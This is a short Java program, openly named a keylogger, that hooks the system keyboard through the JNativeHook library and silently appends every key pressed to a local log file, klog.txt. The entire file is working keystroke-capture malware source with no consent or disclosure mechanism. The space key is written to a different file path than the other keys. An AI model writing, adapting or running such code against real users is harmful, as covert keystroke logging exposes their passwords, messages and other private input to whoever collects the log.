package keylogger;

import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class keylogger implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new keylogger());

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        switch (nke.getKeyCode()) {
            case NativeKeyEvent.VC_SPACE:
                try {
                    FileWriter fw = new FileWriter("keylogger//keylogger//klog.txt", true);
                    fw.write(" ");
                      fw.flush();
                    fw.close();
                  
                } catch (IOException ex) {
                    Logger.getLogger(keylogger.class.getName()).log(Level.SEVERE, null, ex);
                }
                // System.out.print(" ");
                break;
            case NativeKeyEvent.VC_ENTER:
                try {
                    FileWriter fw = new FileWriter("src//keylogger//klog.txt", true);
                    fw.write("\n");
                      fw.flush();
                    fw.close();

                } catch (IOException ex) {
                }
                break;
            case NativeKeyEvent.VC_DOWN:
                try {
                    FileWriter fw = new FileWriter("src//keylogger//klog.txt", true);
                    fw.write("(downArrow)");
                      fw.flush();
                    fw.close();

                } catch (IOException ex) {
                }
                break;
            default:
                try {
                    FileWriter fw = new FileWriter("src//keylogger//klog.txt", true);
                    fw.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
                      fw.flush();
                    fw.close();

                } catch (IOException ex) {
                }
                break;

        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {
        // TODO Auto-generated method stub
        NativeKeyListener.super.nativeKeyTyped(arg0);
    }
}